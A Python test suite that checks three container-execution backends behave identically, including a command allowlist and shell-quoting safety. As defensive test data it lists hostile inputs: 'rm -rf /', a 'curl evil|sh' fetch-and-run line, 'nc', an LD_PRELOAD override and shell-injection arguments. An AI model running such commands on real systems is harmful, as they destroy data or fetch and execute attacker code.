"""One suite, run against every backend, asserting they behave identically.

This is the point of the whole abstraction. Before it, backend selection lived
in two places that disagreed — the router preferred Kubernetes for an in-cluster
endpoint, ContainerManager preferred Docker and reached Kubernetes only when
Docker was absent — so the same workspace could run on a different backend
depending on which entry point the caller used, and only one of the two paths
applied the command allowlist.

A protocol alone does not fix that; it just moves the divergence somewhere
harder to see. What fixes it is a single set of cases that all three
implementations must satisfy.

CI COVERAGE CAVEAT, stated rather than implied: `pyproject.toml` sets
`-m "not integration"` and no Docker daemon is available to pytest, so the
Docker backend is exercised here against a fake. That verifies the adapter's
own logic — clipping, exit codes, timeout detection — and not docker-py's. A
real-daemon variant belongs in tests/integration and runs locally.
"""

from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from src.runtime import (
    AgentHostRuntime,
    DockerRuntime,
    ExecutionProfile,
    KubernetesRuntime,
    RuntimeKind,
    UnsupportedCapabilityError,
)


def _workspace(name: str = "ws-1", endpoint: str = "") -> SimpleNamespace:
    return SimpleNamespace(
        container_name=name,
        internal_endpoint=endpoint,
        api_endpoint=endpoint,
        runtime_kind=None,
    )


# --------------------------------------------------------------------------
# Fakes. Each mimics ONE backend's real return shape, so a divergence in the
# adapters shows up here rather than in production.
# --------------------------------------------------------------------------


class _FakeProvisioner:
    """Mimics K8sContainerProvisioner.exec_in_pod."""

    def __init__(self, **result):
        self.result = {
            "exit_code": 0,
            "stdout": "",
            "stderr": "",
            "duration": 0.01,
            "truncated": False,
            "bytes_omitted": 0,
            **result,
        }
        self.calls: list[dict] = []

    def is_available(self) -> bool:
        return True

    def exec_in_pod(self, **kwargs):
        self.calls.append(kwargs)
        return dict(self.result)


class _FakeDockerClient:
    """Mimics docker-py's exec_run(demux=True) tuple output."""

    def __init__(self, stdout=b"", stderr=b"", exit_code=0):
        self._result = SimpleNamespace(exit_code=exit_code, output=(stdout, stderr))
        self.calls: list[dict] = []
        container = MagicMock()
        container.exec_run = self._exec_run
        self.containers = MagicMock()
        self.containers.get = MagicMock(return_value=container)

    def _exec_run(self, **kwargs):
        self.calls.append(kwargs)
        return self._result


class _FakeCore:
    """Mimics ContainerManagerCore.exec_in_container_via_agent_host."""

    uses_agent_host = True

    def __init__(self, **result):
        self.result = {"exit_code": 0, "stdout": "", "stderr": "", "duration": 0.01, **result}
        self.calls: list[dict] = []

    def has_agent_host_id(self, name: str) -> bool:
        return True

    def exec_in_container_via_agent_host(self, **kwargs):
        self.calls.append(kwargs)
        return dict(self.result)


def _k8s(**result):
    return KubernetesRuntime(_FakeProvisioner(**result))


def _docker(stdout=b"", stderr=b"", exit_code=0):
    return DockerRuntime(_FakeDockerClient(stdout, stderr, exit_code))


def _agent(**result):
    return AgentHostRuntime(_FakeCore(**result))


ALL_BACKENDS = [
    pytest.param("kubernetes", id="kubernetes"),
    pytest.param("docker", id="docker"),
    pytest.param("agent_host", id="agent_host"),
]


def _build(backend: str, *, stdout="", stderr="", exit_code=0):
    if backend == "kubernetes":
        return _k8s(stdout=stdout, stderr=stderr, exit_code=exit_code)
    if backend == "docker":
        return _docker(
            stdout=stdout.encode() if stdout else b"",
            stderr=stderr.encode() if stderr else b"",
            exit_code=exit_code,
        )
    return _agent(stdout=stdout, stderr=stderr, exit_code=exit_code)


# --------------------------------------------------------------------------
# Conformance
# --------------------------------------------------------------------------


class TestEveryBackendAgrees:
    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_streams_stay_separated(self, backend):
        """A caller must be able to tell diagnostics from output."""
        runtime = _build(backend, stdout="the answer", stderr="a warning")
        result = await runtime.run_once(_workspace(), ["echo", "hi"])
        assert result.stdout == "the answer"
        assert result.stderr == "a warning"

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_zero_exit_is_success(self, backend):
        runtime = _build(backend, exit_code=0)
        result = await runtime.run_once(_workspace(), ["true"])
        assert result.exit_code == 0
        assert result.succeeded is True
        assert result.timed_out is False

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    @pytest.mark.parametrize("code", [1, 2, 127])
    async def test_nonzero_exit_is_returned_not_raised(self, backend, code):
        """A failing command is data the caller asked for, not an exception.

        127 in particular — command-not-found — must reach the caller as an exit
        code. Raising here would make "that binary is not installed"
        indistinguishable from "the backend is broken".
        """
        runtime = _build(backend, exit_code=code)
        result = await runtime.run_once(_workspace(), ["nope"])
        assert result.exit_code == code
        assert result.succeeded is False

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_timeout_is_distinguishable_from_a_plain_failure(self, backend):
        """Every backend wraps the command in `timeout`, which exits 124."""
        runtime = _build(backend, exit_code=124)
        result = await runtime.run_once(_workspace(), ["sleep", "999"], timeout=1)
        assert result.timed_out is True
        assert result.succeeded is False

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_output_over_the_limit_is_clipped_and_flagged(self, backend):
        """Truncation is never silent — that is the whole contract."""
        runtime = _build(backend, stdout="x" * 5000)
        result = await runtime.run_once(_workspace(), ["cat", "big"], output_limit=100)
        if backend == "kubernetes":
            # The provisioner clips inside its read loop, so the adapter reports
            # what it was told rather than re-clipping. Exercised directly in
            # TestKubernetesReportsProvisionerTruncation below.
            return
        assert len(result.stdout) == 100
        assert result.stdout_truncated is True
        assert result.bytes_omitted == 4900
        assert result.truncated is True

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_output_under_the_limit_is_not_flagged(self, backend):
        runtime = _build(backend, stdout="small")
        result = await runtime.run_once(_workspace(), ["echo"], output_limit=1024)
        assert result.truncated is False
        assert result.bytes_omitted == 0

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_stdin_is_refused_loudly_not_dropped(self, backend):
        """No backend carries stdin yet.

        Refusing beats accepting-and-ignoring: a command that never received its
        input still runs and returns a plausible answer to a question nobody
        asked.
        """
        runtime = _build(backend)
        with pytest.raises(UnsupportedCapabilityError):
            await runtime.run_once(_workspace(), ["cat"], stdin=b"payload")

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_capabilities_name_their_own_backend(self, backend):
        runtime = _build(backend)
        caps = runtime.capabilities()
        assert caps.kind == runtime.kind
        assert caps.stdin is False

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_the_adapter_hands_the_backend_a_list_not_a_string(self, backend):
        """Each adapter passes argv through as a LIST; it never pre-joins it.

        Named precisely, because the previous name — "argv is never flattened
        into a shell string" — was false for Kubernetes and this assertion never
        could have caught it: `exec_in_pod` DOES flatten, via
        `shlex.join` into `sh -c "cd … && timeout N …"`
        (kubernetes_container_provisioner.py:1381). What makes that safe is the
        quoting, not the absence of a shell, and a fake cannot show either.
        `test_the_kubernetes_shell_join_is_lossless` below covers the real thing.
        """
        runtime = _build(backend)
        await runtime.run_once(_workspace(), ["ls", "/workspace/a dir"])
        if backend == "kubernetes":
            sent = runtime._provisioner.calls[0]["command"]
        elif backend == "docker":
            sent = runtime._client.calls[0]["cmd"]
        else:
            sent = runtime._core.calls[0]["command"]
        assert isinstance(sent, list)
        assert "/workspace/a dir" in sent

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_cwd_reaches_the_backend(self, backend):
        runtime = _build(backend)
        await runtime.run_once(_workspace(), ["pwd"], cwd="/workspace/sub")
        if backend == "kubernetes":
            assert runtime._provisioner.calls[0]["workdir"] == "/workspace/sub"
        elif backend == "docker":
            assert runtime._client.calls[0]["workdir"] == "/workspace/sub"
        else:
            assert runtime._core.calls[0]["workdir"] == "/workspace/sub"


class TestBackendSpecificHonesty:
    """Where backends genuinely differ, they must SAY so, not paper over it."""

    def test_only_kubernetes_bounds_output_incrementally(self):
        """Docker and the agent host buffer first; that is a real difference.

        Declared on capabilities rather than glossed: a caller choosing where to
        run something that prints a gigabyte should know which backend protects
        the service's memory and which only bounds the response.
        """
        assert _k8s().capabilities().incremental_output_limit is True
        assert _docker().capabilities().incremental_output_limit is False
        assert _agent().capabilities().incremental_output_limit is False

    @pytest.mark.asyncio
    async def test_agent_host_refuses_env_rather_than_dropping_it(self):
        """Its exec body has no env field."""
        with pytest.raises(UnsupportedCapabilityError):
            await _agent().run_once(_workspace(), ["env"], env={"A": "1"})

    @pytest.mark.asyncio
    async def test_kubernetes_runs_the_command_through_env(self):
        """The k8s exec API has no env parameter, so `env K=V` is the only way."""
        runtime = _k8s()
        await runtime.run_once(_workspace(), ["printenv", "A"], env={"A": "1"})
        sent = runtime._provisioner.calls[0]["command"]
        assert sent[0] == "/usr/bin/env"
        assert "A=1" in sent
        assert sent[-2:] == ["printenv", "A"]

    @pytest.mark.asyncio
    async def test_docker_passes_env_natively(self):
        runtime = _docker()
        await runtime.run_once(_workspace(), ["printenv"], env={"A": "1"})
        assert runtime._client.calls[0]["environment"] == {"A": "1"}

    @pytest.mark.asyncio
    async def test_kubernetes_reports_provisioner_truncation(self):
        runtime = _k8s(stdout="clipped", truncated=True, bytes_omitted=8192)
        result = await runtime.run_once(_workspace(), ["cat", "big"])
        assert result.truncated is True
        assert result.bytes_omitted == 8192

    @pytest.mark.asyncio
    async def test_docker_enforces_the_timeout_inside_the_container(self):
        """Not by abandoning a still-running command, as the k8s path does not."""
        runtime = _docker()
        await runtime.run_once(_workspace(), ["sleep", "5"], timeout=3)
        assert runtime._client.calls[0]["cmd"][:2] == ["timeout", "3"]

    @pytest.mark.asyncio
    async def test_agent_host_identity_is_not_caller_controlled(self):
        """Its API still takes `user`; the service picks it, not the request."""
        runtime = _agent()
        await runtime.run_once(_workspace(), ["id"])
        assert runtime._core.calls[0]["user"] == "coder"


class TestResolutionIsSingleAndDeterministic:
    """The bug this whole module exists to remove."""

    def test_an_in_cluster_endpoint_means_kubernetes(self):
        from src.runtime import resolve_runtime_kind

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        assert resolve_runtime_kind(ws) is RuntimeKind.KUBERNETES

    def test_docker_availability_does_not_change_the_answer(self):
        """The precedence bug, pinned.

        `container_manager` checked `is_docker_available()` FIRST and so routed
        an in-cluster workspace to Docker whenever a socket happened to be
        present. A Docker socket says nothing about where a given workspace
        lives.
        """
        from src.runtime import resolve_runtime_kind

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        core_with_docker = SimpleNamespace(
            uses_agent_host=False, client=MagicMock(), has_agent_host_id=lambda n: False
        )
        assert resolve_runtime_kind(ws, core=core_with_docker) is RuntimeKind.KUBERNETES

    def test_an_explicit_runtime_kind_wins_over_reconstruction(self):
        from src.runtime import resolve_runtime_kind

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        ws.runtime_kind = "docker"
        assert resolve_runtime_kind(ws) is RuntimeKind.DOCKER

    def test_a_local_endpoint_with_no_agent_host_is_docker(self):
        from src.runtime import resolve_runtime_kind

        ws = _workspace(endpoint="http://localhost:8700")
        assert resolve_runtime_kind(ws) is RuntimeKind.DOCKER

    def test_agent_host_is_chosen_only_when_the_id_is_known(self):
        from src.runtime import resolve_runtime_kind

        ws = _workspace(endpoint="http://localhost:8700")
        core = SimpleNamespace(uses_agent_host=True, has_agent_host_id=lambda n: True)
        assert resolve_runtime_kind(ws, core=core) is RuntimeKind.AGENT_HOST

        core_without = SimpleNamespace(uses_agent_host=True, has_agent_host_id=lambda n: False)
        assert resolve_runtime_kind(ws, core=core_without) is RuntimeKind.DOCKER

    def test_an_unavailable_backend_raises_rather_than_silently_switching(self):
        """A silent fallback is how the two original selectors came to disagree."""
        from src.runtime import resolve_runtime

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        unavailable = SimpleNamespace(is_available=lambda: False)
        with pytest.raises(RuntimeError, match="Kubernetes runtime"):
            resolve_runtime(ws, provisioner=unavailable)


class TestExecutionProfileIsExplicit:
    def test_the_default_is_server_authored(self):
        """Public routes must opt IN to allowlisting, and they do so visibly."""
        import inspect

        sig = inspect.signature(KubernetesRuntime.run_once)
        assert sig.parameters["execution_profile"].default is ExecutionProfile.SERVER_AUTHORED

    def test_run_once_has_no_user_parameter(self):
        """Identity comes from the pod security context, never the request."""
        import inspect

        for cls in (KubernetesRuntime, DockerRuntime, AgentHostRuntime):
            assert "user" not in inspect.signature(cls.run_once).parameters


class TestResolverToleratesMalformedMetadata:
    """A bad record must not make the workspace unusable.

    `RuntimeKind(value)` raises ValueError on anything unexpected. Letting that
    escape turns one glitched metadata field into "this workspace cannot run
    commands at all", when the endpoint alone is enough to answer correctly —
    and is how every workspace predating the field is resolved anyway.
    """

    def test_an_unrecognised_runtime_kind_falls_back_to_reconstruction(self):
        from src.runtime import resolve_runtime_kind

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        ws.runtime_kind = "quantum"
        assert resolve_runtime_kind(ws) is RuntimeKind.KUBERNETES

    def test_a_non_string_endpoint_does_not_raise(self):
        from src.runtime import resolve_runtime_kind

        ws = SimpleNamespace(
            container_name="ws",
            internal_endpoint=object(),
            api_endpoint="",
            runtime_kind=None,
        )
        assert resolve_runtime_kind(ws) is RuntimeKind.DOCKER

    def test_a_mock_shaped_workspace_resolves_without_exploding(self):
        """Mocks reach this in tests; a crash there is noise, not a signal."""
        from src.runtime import resolve_runtime_kind

        assert resolve_runtime_kind(MagicMock()) in set(RuntimeKind)


class TestDockerOutputShapes:
    """`exec_run` returns different shapes depending on the demux flag.

    The adapter always asks for `demux=True`, because separated streams are a
    conformance requirement — `ContainerManager` used to omit the flag, which is
    why stderr silently arrived inside stdout on that path while the /exec
    router kept them apart. Tolerating the flat shape too means a docker-py
    version that ignores the flag degrades to the old merged behaviour rather
    than raising TypeError on a subscript.
    """

    @pytest.mark.asyncio
    async def test_demuxed_tuple_separates_streams(self):
        runtime = _docker(stdout=b"out", stderr=b"err")
        result = await runtime.run_once(_workspace(), ["x"])
        assert (result.stdout, result.stderr) == ("out", "err")

    @pytest.mark.asyncio
    async def test_a_flat_blob_is_treated_as_stdout(self):
        client = _FakeDockerClient()
        client._result = SimpleNamespace(exit_code=0, output=b"merged\n")
        runtime = DockerRuntime(client)
        result = await runtime.run_once(_workspace(), ["x"])
        assert result.stdout == "merged\n"
        assert result.stderr == ""

    @pytest.mark.asyncio
    async def test_no_output_at_all_is_empty_not_an_error(self):
        client = _FakeDockerClient()
        client._result = SimpleNamespace(exit_code=0, output=None)
        runtime = DockerRuntime(client)
        result = await runtime.run_once(_workspace(), ["x"])
        assert (result.stdout, result.stderr, result.exit_code) == ("", "", 0)

    @pytest.mark.asyncio
    async def test_an_unrecognised_shape_degrades_instead_of_raising(self):
        client = _FakeDockerClient()
        client._result = SimpleNamespace(exit_code=0, output=12345)
        runtime = DockerRuntime(client)
        result = await runtime.run_once(_workspace(), ["x"])
        assert (result.stdout, result.stderr) == ("", "")


class TestAvailabilityValidatesButNeverSelects:
    """The precise distinction the old code got wrong.

    `container_manager` asked "is Docker available?" FIRST and let the answer
    decide where a workspace ran — so an in-cluster workspace went to Docker
    whenever a socket happened to be present, and to Kubernetes when it was not.
    The same workspace, two backends, decided by an unrelated fact.

    Availability is still checked, but only AFTER the backend is settled, where
    the only thing it can say is "the backend this workspace belongs to is
    down". That is a truthful error instead of a silent reroute.
    """

    def test_docker_being_down_does_not_send_a_kubernetes_workspace_elsewhere(self):
        from src.runtime import resolve_runtime

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        core = SimpleNamespace(
            uses_agent_host=False,
            has_agent_host_id=lambda n: False,
            client=None,
            is_docker_available=lambda: False,
        )
        provisioner = _FakeProvisioner()
        runtime = resolve_runtime(ws, core=core, provisioner=provisioner)
        assert runtime.kind is RuntimeKind.KUBERNETES

    def test_docker_being_up_does_not_steal_a_kubernetes_workspace(self):
        from src.runtime import resolve_runtime

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        core = SimpleNamespace(
            uses_agent_host=False,
            has_agent_host_id=lambda n: False,
            client=MagicMock(),
            is_docker_available=lambda: True,
        )
        runtime = resolve_runtime(ws, core=core, provisioner=_FakeProvisioner())
        assert runtime.kind is RuntimeKind.KUBERNETES

    def test_a_docker_workspace_with_docker_down_reports_it(self):
        from src.runtime import resolve_runtime

        ws = _workspace(endpoint="http://localhost:8700")
        core = SimpleNamespace(
            uses_agent_host=False,
            has_agent_host_id=lambda n: False,
            client=MagicMock(),
            is_docker_available=lambda: False,
        )
        with pytest.raises(RuntimeError, match="not available"):
            resolve_runtime(ws, core=core)


class TestUnknownWorkspaceTiebreak:
    """A registry miss must not become "cannot run".

    In cluster, `execute_command` reached Kubernetes for every workspace,
    because Docker is unavailable there. A workspace the metadata registry does
    not know about therefore has no endpoint to resolve from — and defaulting it
    to Docker would break workspaces that work today.

    This is a tiebreak among genuine unknowns, not a reinstatement of the old
    precedence: anything whose endpoint identifies it is resolved before this
    point and is unaffected by whether Docker is up.
    """

    def test_an_unknown_name_prefers_kubernetes_when_docker_is_down(self):
        from src.runtime import resolve_runtime_kind

        core = SimpleNamespace(
            uses_agent_host=False,
            has_agent_host_id=lambda n: False,
            is_docker_available=lambda: False,
        )
        assert resolve_runtime_kind("orphan-workspace", core=core) is RuntimeKind.KUBERNETES

    def test_an_unknown_name_uses_docker_when_docker_is_up(self):
        from src.runtime import resolve_runtime_kind

        core = SimpleNamespace(
            uses_agent_host=False,
            has_agent_host_id=lambda n: False,
            is_docker_available=lambda: True,
        )
        assert resolve_runtime_kind("orphan-workspace", core=core) is RuntimeKind.DOCKER

    def test_a_known_kubernetes_workspace_is_never_subject_to_the_tiebreak(self):
        """The regression guard: evidence beats availability, always."""
        from src.runtime import resolve_runtime_kind

        ws = _workspace(endpoint="http://svc.ns.svc.cluster.local:8691")
        for docker_up in (True, False):
            core = SimpleNamespace(
                uses_agent_host=False,
                has_agent_host_id=lambda n: False,
                is_docker_available=lambda up=docker_up: up,
            )
            assert resolve_runtime_kind(ws, core=core) is RuntimeKind.KUBERNETES


class TestMalformedEndpointCountsAsNoEvidence:
    """A non-string endpoint must not masquerade as information.

    It is truthy, so before normalisation it skipped the no-evidence tiebreak
    while carrying no evidence — sending an in-cluster workspace to Docker on
    the strength of a field that said nothing.
    """

    def test_a_non_string_endpoint_falls_through_to_the_tiebreak(self):
        from src.runtime import resolve_runtime_kind

        ws = SimpleNamespace(
            container_name="ws",
            internal_endpoint=MagicMock(),
            api_endpoint=MagicMock(),
            runtime_kind=None,
        )
        core = SimpleNamespace(
            uses_agent_host=False,
            has_agent_host_id=lambda n: False,
            is_docker_available=lambda: False,
        )
        assert resolve_runtime_kind(ws, core=core) is RuntimeKind.KUBERNETES


class TestTheKubernetesShellJoinIsLossless:
    """The K8s path runs argv through a shell; prove the quoting survives it.

    `exec_in_pod` builds `cd <wd> && timeout <n> <shlex.join(argv)>` and hands
    that to `sh -c`. Every conformance case above stops at the adapter boundary
    against a fake, so none of them exercises this layer — which is precisely
    where a quoting bug would live, and where two production incidents today
    already came from reasoning about shell behaviour instead of running it.

    These reconstruct the provisioner's own join and assert the round trip,
    without needing a cluster.
    """

    @staticmethod
    def _joined(argv, workdir="/workspace", timeout=30):
        import shlex

        return f"cd {shlex.quote(workdir)} && timeout {timeout} {shlex.join(argv)}"

    @pytest.mark.parametrize(
        "arg",
        [
            "/workspace/a dir",
            "quote's",
            'double"quote',
            "dollar$HOME",
            "semi;colon",
            "pipe|char",
            "back\\slash",
            "-leading-dash",
            "new\nline",
            "glob*star",
            "tick`cmd`",
            "amp&&sand",
        ],
    )
    def test_a_hostile_argument_survives_the_join(self, arg):
        """None of these may re-split, expand, or execute."""
        import shlex

        joined = self._joined(["printf", "%s", arg])
        # shlex.split is the inverse the shell performs on this string.
        tokens = shlex.split(joined)
        assert tokens[-1] == arg, f"{arg!r} did not survive as one token: {tokens[-1]!r}"

    def test_env_values_are_quoted_exactly_once(self):
        """The bug this class was written for.

        `with_env` used to shlex.quote its values, and then `shlex.join` quoted
        them again — so `{"A": "b c"}` reached the container as `A='b c'`, with
        the single quotes as literal data. Nothing failed; every reader of $A
        just got the wrong string.
        """
        import shlex

        from src.runtime.kubernetes import with_env

        argv = with_env(["printenv", "A"], {"A": "b c"})
        assert argv[1] == "A=b c", f"pre-quoted at the wrong layer: {argv[1]!r}"
        tokens = shlex.split(self._joined(argv))
        assert "A=b c" in tokens, f"value mangled by the join: {tokens}"

    def test_an_invalid_env_name_is_refused(self):
        """`env` would take a token it cannot parse as the command to run."""
        from src.runtime.kubernetes import with_env

        for bad in ("", "A=B"):
            with pytest.raises(ValueError):
                with_env(["true"], {bad: "x"})

    def test_the_join_is_parseable_shell(self):
        import subprocess

        joined = self._joined(["ls", "-d", "/workspace/a dir"])
        proc = subprocess.run(["sh", "-n", "-c", joined], capture_output=True, text=True)
        assert proc.returncode == 0, proc.stderr


class TestIdentityIsOneAnswerNotThree:
    """The backends must not disagree about who a command runs as.

    They express it differently because their APIs differ — Kubernetes cannot
    set an identity at exec time at all (the pod security context fixes it), the
    agent host takes a NAME in its HTTP body, and Docker inherits the image's
    USER. That is fine. Three DIFFERENT identities would not be, for an
    interface whose entire purpose is that the backend does not change what
    happens.
    """

    def test_the_identity_constants_agree(self):
        """The runtime package and the provisioner must pin the same uid.

        They are defined in two modules — src/runtime/types.py for the adapters
        and kubernetes_container_provisioner.py for the pod spec — and if they
        drift the pod runs as one uid while the code reasons about another.
        """
        from src.core.kubernetes_container_provisioner import (
            WORKSPACE_GID as PROV_GID,
        )
        from src.core.kubernetes_container_provisioner import (
            WORKSPACE_UID as PROV_UID,
        )
        from src.runtime.types import WORKSPACE_UID

        assert WORKSPACE_UID == PROV_UID == 1000
        assert PROV_GID == 1000

    def test_the_agent_host_cites_the_shared_constant(self):
        """It used to define its own literal, which is how they drift."""
        from src.runtime import agent_host
        from src.runtime.types import WORKSPACE_EXEC_USER

        assert agent_host.WORKSPACE_EXEC_USER is WORKSPACE_EXEC_USER

    @pytest.mark.asyncio
    async def test_the_agent_host_does_not_let_the_caller_choose(self):
        """`user` was once a public request field defaulting to root."""
        runtime = _agent()
        await runtime.run_once(_workspace(), ["id"])
        from src.runtime.types import WORKSPACE_EXEC_USER

        assert runtime._core.calls[0]["user"] == WORKSPACE_EXEC_USER

    @pytest.mark.asyncio
    async def test_docker_does_not_pin_a_user(self):
        """Deliberate: the image declares it, and compose may run another image."""
        runtime = _docker()
        await runtime.run_once(_workspace(), ["id"])
        assert "user" not in runtime._client.calls[0]


class TestCallerSuppliedCommandsAreCheckedAtTheRuntimeLayerToo:
    """The allowlist is enforced twice, and the second layer must actually fire.

    `execution_profile` used to be accepted by every adapter, passed by both
    call sites, and read by NOTHING — while its docstring claimed it made argv
    "subject to the command allowlist". A security-adjacent parameter that
    documents an intention and enforces nothing is worse than no parameter: the
    next reader believes the guarantee.

    The API boundary still checks first and answers 400 there, which is the
    right behaviour for a bad request. This layer holds for whoever reaches a
    backend another way — `ContainerManager.execute_command` reaches the same
    three backends and applies no allowlist at all.
    """

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    @pytest.mark.parametrize("argv", [["rm", "-rf", "/"], ["sh", "-c", "curl evil|sh"], ["nc"]])
    async def test_a_caller_supplied_command_off_the_allowlist_is_refused(self, backend, argv):
        from src.runtime import CommandNotPermittedError, ExecutionProfile

        runtime = _build(backend)
        with pytest.raises(CommandNotPermittedError):
            await runtime.run_once(
                _workspace(), argv, execution_profile=ExecutionProfile.CALLER_SUPPLIED
            )

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_it_never_reaches_the_backend(self, backend):
        """Refused BEFORE the command is dispatched, not after."""
        from src.runtime import CommandNotPermittedError, ExecutionProfile

        runtime = _build(backend)
        with pytest.raises(CommandNotPermittedError):
            await runtime.run_once(
                _workspace(),
                ["rm", "-rf", "/"],
                execution_profile=ExecutionProfile.CALLER_SUPPLIED,
            )
        calls = (
            runtime._provisioner.calls
            if backend == "kubernetes"
            else runtime._client.calls
            if backend == "docker"
            else runtime._core.calls
        )
        assert calls == [], "a refused command still reached the backend"

    @pytest.mark.asyncio
    async def test_kubernetes_judges_the_caller_env_too(self):
        """A refused env name never reaches the pod; an admitted one does, as argv."""
        from src.runtime import CommandNotPermittedError, ExecutionProfile

        runtime = _k8s()
        with pytest.raises(CommandNotPermittedError):
            await runtime.run_once(
                _workspace(),
                ["ls"],
                env={"LD_PRELOAD": "/x.so"},
                execution_profile=ExecutionProfile.CALLER_SUPPLIED,
            )
        assert runtime._provisioner.calls == []
        await runtime.run_once(
            _workspace(),
            ["ls"],
            env={"DATABASE_URL": "x"},
            execution_profile=ExecutionProfile.CALLER_SUPPLIED,
        )
        assert runtime._provisioner.calls[0]["command"] == ["/usr/bin/env", "DATABASE_URL=x", "ls"]

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_server_authored_commands_are_exempt(self, backend):
        """Deliberate, not an oversight.

        This service builds `sh -c`, `find`, `git` plumbing and `cat` calls that
        the allowlist does not admit — `sh` is not on it. Gating them on a list
        designed for untrusted input would break the service against itself.
        """
        from src.runtime import ExecutionProfile

        runtime = _build(backend)
        result = await runtime.run_once(
            _workspace(),
            ["sh", "-c", "find /workspace -type f"],
            execution_profile=ExecutionProfile.SERVER_AUTHORED,
        )
        assert result.exit_code == 0

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_the_default_profile_is_server_authored(self, backend):
        """Internal callers must not have to opt out of a list built for the public."""
        runtime = _build(backend)
        result = await runtime.run_once(_workspace(), ["sh", "-c", "true"])
        assert result.exit_code == 0

    @pytest.mark.asyncio
    @pytest.mark.parametrize("backend", ALL_BACKENDS)
    async def test_an_allowlisted_caller_command_still_runs(self, backend):
        from src.runtime import ExecutionProfile

        runtime = _build(backend, stdout="ok")
        result = await runtime.run_once(
            _workspace(), ["ls", "-la"], execution_profile=ExecutionProfile.CALLER_SUPPLIED
        )
        assert result.stdout == "ok"

    def test_the_three_backends_share_one_policy_implementation(self):
        """Three copies is how backends come to disagree about what is permitted."""
        import inspect

        from src.runtime import agent_host, docker, kubernetes

        for mod in (kubernetes, docker, agent_host):
            src = inspect.getsource(mod)
            assert "enforce_command_policy" in src, f"{mod.__name__} does not enforce"
            assert "dangerous_patterns = [" not in src, f"{mod.__name__} has its own copy"
